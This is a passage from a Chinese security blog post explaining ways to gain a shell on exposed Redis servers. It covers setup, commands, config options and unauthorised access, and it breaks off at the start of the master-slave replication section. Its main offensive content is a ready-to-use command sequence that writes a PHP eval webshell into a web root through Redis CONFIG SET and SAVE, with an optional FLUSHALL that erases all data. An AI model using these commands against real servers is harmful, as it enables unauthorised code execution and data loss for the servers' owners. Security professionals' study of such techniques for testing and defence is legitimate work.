<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
<title>
    æ”»åŸè‚¾é€shi | sv3nbeast
</title>
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://www.svenbeast.com">

<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
<meta name="author" content="æ–¯æ–‡">
<meta name="description" content="Let&#39;s move in life.  ä¸åœ¨å¹³é™ä¸­ç­äº¡~  ">
<meta name="keywords" content="å¸Œæœ›èƒ½å¤Ÿæ‰¾åˆ°å¯¹ä½ æœ‰å¸®åŠ©çš„ä¿¡æ¯ï¼ŒWish you luck !">
<script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.3/assets/media/css/style.min.css" />

<link rel="stylesheet" href="https://www.svenbeast.com/styles/main.css" />

<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.2/assets/media/css/tags.css" />

<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">


<!-- åŸ   -->
<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>

<!--
<script src="https://src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script>
-->
<!-- <script src="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.3/assets/media/script/APlayer.min.js"></script> -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
    

	<script src="https://unpkg.com/valine@1.5.1/dist/Valine.min.js"></script>

        <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>

	<script src="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.3/assets/media/script/tocbot.min.js"></script>
        <script src="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.3/assets/media/script/script.min.js"></script>
        <script src="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.3/assets/media/script/icon.min.js"></script>

	<script src="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.2/assets/media/script/loading.js" />

        <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.13.1/build/highlight.min.js"></script>
        <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.18.1/build/styles/atelier-estuary-dark.min.css">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
        <script src="//instant.page/5.0.1" type="module" integrity="sha384-0DvoZ9kNcB36fWcQApIMIGQoTzoBDYTQ85e8nmsfFOGz4RHAdUhADqJt4k3K2uLS"></script>
        <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
                
                    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-148503364-1"></script>
                    <script>
                        window.dataLayer = window.dataLayer || [];

                        function gtag() {
                            dataLayer.push(arguments);
                        }
                        gtag('js', new Date());
                        gtag('config', 'UA-148503364-1');
                    </script>
                    
			<!-- ç™¾åº¦ç»Ÿè®¡ -->
		    
                    <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?2923d8edae253fc73c79d220fa60ef4d";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
                    

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xiangyi715/Gridea-Chic-Unique@1.0.3/assets/media/live2d/css/live2d.css" />
</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo">
                <a href="https://www.svenbeast.com">
                    æ”»åŸè‚¾é€shi | sv3nbeast
                </a>
            </div>

            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/">
                         é¦–é¡µ
                    </a>
                    
                    <a class="menu-item" href="/posts">
                        ğŸ“ƒæ–‡ç« åˆ—è¡¨
                    </a>
                    
                    <a class="menu-item" href="/archives">
                        ğŸ“–å½’æ¡£
                    </a>
                    
                    <a class="menu-item" href="/tags">
                         ğŸ·ï¸æ ‡ç­¾
                    </a>
                    
                    <a class="menu-item" href="/post/about">
                        ğŸ”¥å…³äº
                    </a>
                    
                        <input id="switch_default" type="checkbox" class="switch_default">
                        <label for="switch_default" class="toggleBtn"></label>
            </div>

            <form id="gridea-search-form" data-update="1745841328098" action="/search/index.html">
                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="ğŸ”Search..." style = "-webkit-border-radius:8px;
				   -moz-border-radius:8px;
				   -ms-border-radius:8px;
				   -o-border-radius:8px;
				   border-radius:8px;
				   border:1px solid #e7f3f9;
				   outline:none;
				   padding:7px 0px;
				   BACKGROUND-COLOR: transparent">
            </form>
        </div>

    </nav>

    
        <nav class="navbar-mobile" id="nav-mobile">
            <div class="container">
                <div class="navbar-header">
                    <div>
                        <a href="https://www.svenbeast.com">
                            æ”»åŸè‚¾é€shi | sv3nbeast
                        </a>
                        <!--en-->
                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
                        <!--zh-->
                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;\u6697\u9ED1</a>
                    </div>
                    <form id="gridea-search-form" data-update="1745841328098" action="/search/index.html">
                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="ğŸ”Search..." style = "-webkit-border-radius:8px;
				   -moz-border-radius:8px;
				   -ms-border-radius:8px;
				   -o-border-radius:8px;
				   border-radius:8px;
				   border:1px solid #62a3d3;
				   outline:none;
				   padding:7px 0px;
				   BACKGROUND-COLOR: transparent">
                    </form>
                    <!--en-->
                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
                    <!--zh-->
                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>

                </div>
                <div class="menu" id="mobile-menu">
                    
                        <a class="menu-item" href="/">
                             é¦–é¡µ
                        </a>
                        
                        <a class="menu-item" href="/posts">
                            ğŸ“ƒæ–‡ç« åˆ—è¡¨
                        </a>
                        
                        <a class="menu-item" href="/archives">
                            ğŸ“–å½’æ¡£
                        </a>
                        
                        <a class="menu-item" href="/tags">
                             ğŸ·ï¸æ ‡ç­¾
                        </a>
                        
                        <a class="menu-item" href="/post/about">
                            ğŸ”¥å…³äº
                        </a>
                        
                </div>
            </div>
        </nav>
</header>

<style>
input:focus{
/* 
            outline: 0;
	    border: 1px solid #f95d5d;
	    box-shadow: 0px 0px 10px 0px #f95d5d;
*/
	    border-style:solid;  
            border-color: #03a9f4;  
            box-shadow: 0 0 15px #03a9f4;
  }
</style>

<script>

    var mobileBtn = function f() {
        var toggleMenu = document.getElementById("menu-toggle-en");
        var toggleMenu_zh = document.getElementById("menu-toggle-zh");

        var mobileMenu = document.getElementById("mobile-menu");
        if (toggleMenu.display != "none") {
            if (toggleMenu.classList.contains("active")) {
                toggleMenu.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu.classList.add("active")
                mobileMenu.classList.add("active")
            }
        } else if (toggleMenu_zh.display != "none") {
            if (toggleMenu_zh.classList.contains("active")) {
                toggleMenu_zh.classList.remove("active")
                mobileMenu.classList.remove("active")
            } else {
                toggleMenu_zh.classList.add("active")
                mobileMenu.classList.add("active")
            }
        }

    }
</script>

        <div class="main">
            <div class="container">
                <article class="post-wrap">
                    <header class="post-header">
                        <h1 class="post-title">
                            åˆ©ç”¨Redis Getshellçš„æ‰€æœ‰åˆ©ç”¨æ–¹æ³•
                        </h1>
                        <!--en-->
                        <div class="post-meta en">
                            Author:
                            <a itemprop="author" rel="author" href="/">
                            æ–¯æ–‡
<!--
                                æ”»åŸè‚¾é€shi | sv3nbeast
-->
                            </a>
                            <span class="post-time">
                                Date: <a href="#">2022-04-14</a>
                            </span>
				<span class="post-readtime">Reading Time:<a href="#">19.4 mins</a></span>
                                <span class="post-words">words:<a href="#">4617</a></span>
                            
                            <span class="post-category">
                                Category:
                                
                                <a href="https://www.svenbeast.com/tag/MIQGEYrt9/">Redis</a>
                                
                                <a href="https://www.svenbeast.com/tag/rwt8EXIMSg/">ç¬”è®°</a>
                                
                            </span>
                            

<!-- åˆ†äº« -->
				<span style="margin-right:15px">
				<i class="post-share"></i>
				<span>share:</span>
				<a title="QR code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://www.svenbeast.com/post/g2K6Xk3IG/"><i class="fa fa-qrcode"></i></a>
				<a title="qq share" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://www.svenbeast.com/post/g2K6Xk3IG/&sharesource=qzone&title=åˆ©ç”¨Redis Getshellçš„æ‰€æœ‰åˆ©ç”¨æ–¹æ³•&pics=https://blog.blinkstar.cn/images/avatar.png&summary="><i class="fa fa-qq"></i></a>
				<a title="weibo share" target="_blank" href="https://service.weibo.com/share/share.php?url=https://www.svenbeast.com/post/g2K6Xk3IG/&sharesource=weibo&title=åˆ©ç”¨Redis Getshellçš„æ‰€æœ‰åˆ©ç”¨æ–¹æ³• + " - " + &pic="https://blog.blinkstar.cn/images/avatar.png"><i class="fa fa-weibo"></i></a>
				</span>

                        </div>
                        <!--zh-->
                        <div class="post-meta zh">
                            &#x4F5C;&#x8005;:
                            <a itemprop="author" rel="author" href="/">				
                            æ–¯æ–‡
<!--
                                æ”»åŸè‚¾é€shi | sv3nbeast
-->
                            </a>
                            <span class="post-time">&#x65E5;&#x671F;: <a href="#">2022-04-14</a></span>
			    <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a href="#">19.4 &#x5206;&#x949F;</a></span>
                                <span class="post-words">&#x5B57;&#x6570;:<a href="#">4617</a></span>
                            
                            <span class="post-category">&#x5206;&#x7C7B;:
                                
                                <a href="https://www.svenbeast.com/tag/MIQGEYrt9/">Redis</a>
                                
                                <a href="https://www.svenbeast.com/tag/rwt8EXIMSg/">ç¬”è®°</a>
                                
                            </span>
                            
<!-- åˆ†äº« -->
				<span style="margin-right:15px">
				<i class="post-share"></i>
				<span>&#x5206;&#x4EAB;:</span>
				<a title="QR ç " target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://www.svenbeast.com/post/g2K6Xk3IG/"><i class="fa fa-qrcode"></i></a>
				<a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://www.svenbeast.com/post/g2K6Xk3IG/&sharesource=qzone&title=åˆ©ç”¨Redis Getshellçš„æ‰€æœ‰åˆ©ç”¨æ–¹æ³•&pics=https://blog.blinkstar.cn/images/avatar.png&summary="><i class="fa fa-qq"></i></a>
				<a title="æ–°æµªå¾®åš" target="_blank" href="https://service.weibo.com/share/share.php?url=https://www.svenbeast.com/post/g2K6Xk3IG/&sharesource=weibo&title=åˆ©ç”¨Redis Getshellçš„æ‰€æœ‰åˆ©ç”¨æ–¹æ³• + " - " + &pic="https://blog.blinkstar.cn/images/avatar.png"><i class="fa fa-weibo"></i></a>
				</span>

                        </div>
                    </header>
                    <div class="post-content">
                        <h3 id="0x00-redis-ç®€ä»‹">0x00 Redis ç®€ä»‹</h3>
<p>Redisï¼ˆRemote Dictionary Server )ï¼Œå³è¿œç¨‹å­—å…¸æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„APIã€‚ç”±äºå…¶è‡ªèº«ç‰¹ç‚¹ï¼Œå¯ä»¥å¹¿æ³›åº”ç”¨åœ¨æ•°æ®é›†ç¾¤ï¼Œåˆ†å¸ƒå¼é˜Ÿåˆ—ï¼Œä¿¡æ¯ä¸­é—´ä»¶ç­‰ç½‘ç»œæ¶æ„ä¸­ï¼Œåœ¨å†…ç½‘æ¸—é€çš„çªç ´ä¸­ï¼Œå¸¸å¸¸æ‰®æ¼”getshellçš„è§’è‰²ï¼Œredisä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº†master-slave(ä¸»ä»)åŒæ­¥ã€‚</p>
<p>æ€»ç»“ â€” ä¸€ä¸ªæ•°æ®åº“ï¼Œé»˜è®¤ç«¯å£æ˜¯6379ï¼Œæ‹¥æœ‰å¾ˆå¤šæ¼æ´ã€‚</p>
<h3 id="0x01-ç¯å¢ƒ-å·¥å…·å‡†å¤‡">0x01 ç¯å¢ƒ &amp; å·¥å…·å‡†å¤‡</h3>
<p>Linux ç¼–è¯‘å®‰è£…ï¼Œå®‰è£…åä»…èƒ½åœ¨å®‰è£…ç›®å½•ä¸‹è¿è¡Œ</p>
<pre><code>wget https://download.redis.io/releases/redis-6.2.5.tar.gz
tar xzf redis-6.2.5.tar.gz
cd redis-6.2.5
make
# å¯åŠ¨ redis æœåŠ¡ï¼Œå¯ä»¥æŒ‡å®šé…ç½®æ–‡ä»¶å¯åŠ¨(è‹¥ä¸æŒ‡å®šåˆ™ä»¥é»˜è®¤çš„é…ç½®æ–‡ä»¶å¯åŠ¨)
cd src
./redis-server
# å¯åŠ¨ redis å®¢æˆ·ç«¯
./redis-cli
</code></pre>
<p>Windows å®‰è£…</p>
<pre><code>https://github.com/MicrosoftArchive/redis/releases
ä¸‹è½½ Redis-x64-3.0.504.zip å¹¶è§£å‹
redis-server.exe redis.windows.conf
</code></pre>
<p>Dockerå®‰è£…</p>
<pre><code>docker pull vertigo/redis4
docker run -p 6379:6379 vertigo/redis4
</code></pre>
<p>å¯èƒ½ç”¨åˆ°çš„åˆ©ç”¨å·¥å…·</p>
<ul>
<li>
<p><a href="https://github.com/microsoftarchive/redis/releases/download/win-3.0.504/Redis-x64-3.0.504.zip">redis-cli</a></p>
</li>
<li>
<p><a href="https://github.com/SafeGroceryStore/MDUT">MDUT</a></p>
</li>
<li>
<p><a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a></p>
</li>
<li>
<p><a href="https://github.com/rek7/dll-hijacking">dll-hijacking</a></p>
</li>
<li>
<p><a href="https://github.com/tarunkant/Gopherus.git">Gopherus</a></p>
</li>
</ul>
<h3 id="0x02-redis-è¯­æ³•">0x02 Redis è¯­æ³•</h3>
<ul>
<li>Redis é”®å‘½ä»¤çš„åŸºæœ¬è¯­æ³•ä¸ºï¼š COMMAND KEY_NAME</li>
<li>ä½¿ç”¨ * å¯ä»¥è·å–æ‰€æœ‰é…ç½®é¡¹(GET ã€ KEYS)</li>
<li>ä½¿ç”¨ SET å’Œ GET å‘½ä»¤ï¼Œå¯ä»¥å®ŒæˆåŸºæœ¬çš„èµ‹å€¼å’Œå–å€¼æ“ä½œï¼›</li>
<li>Redis ä¸åŒºåˆ†å‘½ä»¤çš„å¤§å°å†™ï¼Œset å’Œ SET æ˜¯åŒä¸€ä¸ªæ„æ€ï¼›</li>
<li>å¦‚æœé”®çš„å€¼ä¸­æœ‰ç©ºæ ¼ï¼Œéœ€è¦ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼›</li>
</ul>
<pre><code>SET key &quot;Hello World&quot;                        # è®¾ç½®é”® key çš„å€¼ä¸ºå­—ç¬¦ä¸² Hello World
GET key                                     # è·å–é”® key çš„å€¼ï¼Œå¦‚æœ key ä¸å­˜åœ¨ï¼Œè¿”å› nil ã€‚å¦‚æœkey å‚¨å­˜çš„å€¼ä¸æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œè¿”å›ä¸€ä¸ªé”™è¯¯
DEL key                                     # åˆ é™¤é”® key
KEYS *                                      # è·å– redis ä¸­æ‰€æœ‰çš„ key,Keys å‘½ä»¤ç”¨äºæŸ¥æ‰¾æ‰€æœ‰ç¬¦åˆç»™å®šæ¨¡å¼ pattern çš„ key
SAVE                                           # ç”¨äºåˆ›å»ºå½“å‰æ•°æ®åº“çš„å¤‡ä»½,åœ¨ redis å®‰è£…ç›®å½•ä¸­åˆ›å»ºdump.rdbæ–‡ä»¶
CONFIG GET requirepass                         # ç”¨äºè·å– redis æœåŠ¡çš„é…ç½®å‚æ•°ï¼Œé€šè¿‡ CONFIG å‘½ä»¤æŸ¥çœ‹æˆ–è®¾ç½®é…ç½®é¡¹
CONFIG REWRITE requirepass &quot;123456&quot;         # å¯¹ redis.conf é…ç½®æ–‡ä»¶è¿›è¡Œæ”¹å†™ï¼Œé‡å¯åæ‰ä¼šè¢«ä¿®æ”¹
CONFIG SET requirepass &quot;123456&quot;             # åŠ¨æ€åœ°è°ƒæ•´ Redis æœåŠ¡å™¨çš„é…ç½®(configuration)è€Œæ— é¡»é‡å¯
Flushall                                    # ç”¨äºæ¸…ç©ºæ•´ä¸ª Redis æœåŠ¡å™¨çš„æ•°æ®(åˆ é™¤æ‰€æœ‰æ•°æ®åº“çš„æ‰€æœ‰ key)
SELECT index                                # Redis Select å‘½ä»¤ç”¨äºåˆ‡æ¢åˆ°æŒ‡å®šçš„æ•°æ®åº“ï¼Œæ•°æ®åº“ç´¢å¼•å· index ç”¨æ•°å­—å€¼æŒ‡å®šï¼Œä»¥ 0 ä½œä¸ºèµ·å§‹ç´¢å¼•å€¼ã€‚
</code></pre>
<h3 id="0x03-redis-é…ç½®æ–‡ä»¶">0x03 Redis é…ç½®æ–‡ä»¶</h3>
<p>Redis çš„é…ç½®æ–‡ä»¶ä½äº Redis å®‰è£…ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åä¸º redis.conf(Windows åä¸º redis.windows.conf)ã€‚å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®šé…ç½®æ–‡ä»¶æ¥è¿›è¡Œå¯åŠ¨ã€‚åˆ—ä¸¾ä¸€äº›é‡è¦çš„é…ç½®é¡¹è¿›è¡Œè¯´æ˜ã€‚</p>
<table>
<thead>
<tr>
<th><strong>é…ç½®é¡¹</strong></th>
<th><strong>è¯´æ˜</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>port 6379</td>
<td>æŒ‡å®š Redis ç›‘å¬ç«¯å£ï¼Œé»˜è®¤ç«¯å£ä¸º 6379</td>
</tr>
<tr>
<td>bind 127.0.0.1</td>
<td>ç»‘å®šçš„ä¸»æœºåœ°å€ï¼Œæ ¼å¼ä¸ºbindåé¢æ¥IPåœ°å€ï¼Œå¯ä»¥åŒæ—¶ç»‘å®šåœ¨å¤šä¸ªIPåœ°å€ä¸Šï¼ŒIPåœ°å€ä¹‹é—´ç”¨ç©ºæ ¼åˆ†ç¦»ï¼Œå¦‚ bind 192.168.1.100 10.0.0.1ï¼Œè¡¨ç¤ºåŒæ—¶ç»‘å®šåœ¨192.168.1.100å’Œ10.0.0.1ä¸¤ä¸ªIPåœ°å€ä¸Šã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šbindå‚æ•°ï¼Œåˆ™ç»‘å®šåœ¨æœ¬æœºçš„æ‰€æœ‰IPåœ°å€ä¸Šã€‚</td>
</tr>
<tr>
<td>save <seconds> <changes></td>
<td>æ ¼å¼ä¸º save &lt;ç§’æ•°&gt; &lt;å˜åŒ–æ•°&gt;ï¼Œè¡¨ç¤ºåœ¨æŒ‡å®šçš„ç§’æ•°å†…æ•°æ®åº“å­˜åœ¨æŒ‡å®šçš„æ”¹å˜æ•°æ—¶è‡ªåŠ¨è¿›è¡Œå¤‡ä»½ä¹Ÿå°±æ˜¯æŒ‡å®šåœ¨å¤šé•¿æ—¶é—´å†…ï¼Œæœ‰å¤šå°‘æ¬¡æ›´æ–°æ“ä½œï¼Œå°±å°†æ•°æ®åŒæ­¥åˆ°æ•°æ®æ–‡ä»¶ï¼Œå¯ä»¥å¤šä¸ªæ¡ä»¶é…åˆ</td>
</tr>
<tr>
<td>dbfilename dump.rdb</td>
<td>æŒ‡å®šæœ¬åœ°æ•°æ®åº“æ–‡ä»¶åï¼Œé»˜è®¤å€¼ä¸º dump.rdb</td>
</tr>
<tr>
<td>dir ./</td>
<td>æŒ‡å®šæœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½•ï¼ŒæŒ‡æ˜ Redis çš„å·¥ä½œç›®å½•ä¸ºè®¾å®šçš„ç›®å½•ï¼ŒRedis äº§ç”Ÿçš„å¤‡ä»½æ–‡ä»¶å°†æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹</td>
</tr>
<tr>
<td>requirepass foobared</td>
<td>è®¾ç½® Redis è¿æ¥å¯†ç ï¼Œå¦‚æœé…ç½®äº†è¿æ¥å¯†ç ï¼Œå®¢æˆ·ç«¯åœ¨è¿æ¥ Redis æ—¶éœ€è¦é€šè¿‡ AUTH <password> å‘½ä»¤æä¾›å¯†ç ï¼Œé»˜è®¤å…³é—­</td>
</tr>
<tr>
<td>protected-mode</td>
<td>redis3.2 ç‰ˆæœ¬åæ–°å¢ protected-mode é…ç½®ï¼Œé»˜è®¤æ˜¯ yes ï¼Œç”¨äºè®¾ç½®å¤–éƒ¨ç½‘ç»œè¿æ¥ redis æœåŠ¡ã€‚å…³é—­ protected-mode æ¨¡å¼ï¼Œæ­¤æ—¶å¤–éƒ¨ç½‘ç»œå¯ä»¥ç›´æ¥è®¿é—®ã€‚å¼€å¯ protected-mode ä¿æŠ¤æ¨¡å¼ï¼Œéœ€é…ç½® bind ip æˆ–è€…è®¾ç½®è®¿é—®å¯†ç ã€‚</td>
</tr>
</tbody>
</table>
<h3 id="0x04-redis-winlinxu-æ¼æ´åˆ©ç”¨">0x04 Redis Win&amp;Linxu æ¼æ´åˆ©ç”¨</h3>
<h4 id="redisæœªæˆæƒ">Redisæœªæˆæƒ</h4>
<h5 id="1æ¼æ´åˆ©ç”¨">1.æ¼æ´åˆ©ç”¨</h5>
<p>ä¸‹è½½<a href="https://github.com/MicrosoftArchive/redis/releases">Redis-v3.0</a>,é»˜è®¤æƒ…å†µä¸‹å¼€å¯redis-server.exe</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141836235.png" alt="image-20220316212609301" loading="lazy"></figure>
<p>åˆ©ç”¨æ•°æ®åº“è¿æ¥å·¥å…·æ­£å¸¸è¿æ¥å³å¯ï¼Œæ— éœ€å¯†ç </p>
<figure data-type="image" tabindex="2"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837431.png" alt="image-20220316212154432" loading="lazy"></figure>
<h4 id="åˆ©ç”¨-redis-å†™å…¥webshell">åˆ©ç”¨ Redis å†™å…¥webshell</h4>
<h5 id="1æ¼æ´åŸç†">1.æ¼æ´åŸç†</h5>
<p>Rediså­˜åœ¨æŒä¹…åŒ–æœºåˆ¶ï¼Œåˆ†ä¸ºæ‰‹åŠ¨è§¦å‘å’Œè‡ªåŠ¨è§¦å‘ï¼Œå¯ä»¥ä½¿ç”¨saveå‘½ä»¤æ‰‹åŠ¨è§¦å‘å¤‡ä»½æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œé€šè¿‡è¿™ä¸ªæœºåˆ¶å¯ä»¥è¾¾åˆ°å‘æœåŠ¡å™¨ä»»æ„è·¯å¾„å†™å…¥ä»»æ„æ–‡ä»¶åå’Œä»»æ„æ–‡ä»¶å†…å®¹çš„ç›®çš„ã€‚</p>
<h5 id="2åˆ©ç”¨åœºæ™¯">2.åˆ©ç”¨åœºæ™¯</h5>
<p>Redis å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…æš´ç ´å¯†ç æˆåŠŸï¼Œæœ€ç»ˆè¿æ¥Redisæ•°æ®åº“æˆåŠŸçš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶å¼€å¯äº† web æœåŠ¡ï¼ŒçŸ¥é“ web ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œå…·æœ‰æ–‡ä»¶è¯»å†™æƒé™</p>
<h5 id="3åˆ©ç”¨è¿‡ç¨‹">3.åˆ©ç”¨è¿‡ç¨‹</h5>
<pre><code># phpstudyä¸‹è½½å®‰è£…ï¼Œå…¨ç¨‹é»˜è®¤é€‰é¡¹å®‰è£…
https://public.xp.cn/upgrades/phpStudy_64.zip
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837756.png" alt="image-20220316223124537" loading="lazy"></figure>
<pre><code>#å®é™…åˆ©ç”¨ä¸­æŸ¥çœ‹å½“å‰æ•°æ®åº“æ˜¯å¦æœ‰ç¼“å­˜
dbsize
#æœ‰ç¼“å­˜æ—¶åˆ‡æ¢åˆ°å…¶ä»–æ•°æ®åº“ï¼Œredisé»˜è®¤æœ‰16ä¸ªæ•°æ®åº“ï¼Œå°½é‡å¯»æ‰¾æ²¡æœ‰ç¼“å­˜æˆ–ç¼“å­˜è¾ƒå°‘çš„æ•°æ®åº“
select 15
#è‹¥æœªå‘ç°æœ‰å¯åˆ©ç”¨æ•°æ®åº“ï¼Œæ ¹æ®æƒ…å†µå†³å®šæ˜¯å¦éœ€è¦ä½¿ç”¨æ­¤å‘½ä»¤æ¸…é™¤æ‰€æœ‰æ•°æ®åº“
Flushall
#å¼€å§‹åˆ©ç”¨
config set dir C:\phpstudy_pro\WWW
config set dbfilename shell.php
set xxx &quot;&lt;?php eval($_REQUEST[cmd]);?&gt;&quot;   
#\r\n\r\n ä»£è¡¨æ¢è¡Œçš„æ„æ€ï¼Œç”¨rediså†™å…¥æ–‡ä»¶çš„ä¼šè‡ªå¸¦ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯ï¼Œåœ¨å†™å…¥ä¸€äº›åé—¨æ–‡ä»¶æ—¶è‡ªè¡Œåˆ†è¾¨æ˜¯å¦éœ€è¦æ·»åŠ æ¢è¡Œç¬¦ï¼Œä¸ªåˆ«æ–‡ä»¶å¦‚æœä¸æ¢è¡Œå¯èƒ½ä¼šå¯¼è‡´æ— æ³•æ‰§è¡Œ
save
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://cdn.jsdelivr.net/gh/Ru1e/blogImage@main/images/202204141837522.png" alt="image-20220324121123246" loading="lazy"></figure>
<h4 id="åˆ©ç”¨-redis-ä¸»ä»å¤åˆ¶-getshell">åˆ©ç”¨ Redis ä¸»ä»å¤åˆ¶ Getshell</h4>
<h5 id="1æ¼æ´åŸç†-2">1.æ¼æ´åŸç†</h5>
<p>Redis æ˜¯ä¸€ä¸ªä½¿ç”¨ ANSIC ç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ª Redis çš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRedis å°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ª redis å®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚åŸºäº Redis ä¸»ä»å¤åˆ¶çš„æœºåˆ¶ï¼Œå¯ä»¥é€šè¿‡ FULLRESYNC å°†ä»»æ„æ–‡ä»¶åŒæ­¥åˆ°ä»èŠ‚ç‚¹ï¼ˆslaveï¼‰ä»è€Œåˆ©ç”¨æ¼æ´è·å–æƒé™ã€‚</p>
<h5 id="2åˆ©ç”¨åœºæ™¯-2">2.åˆ©ç”¨åœºæ™¯</h5>
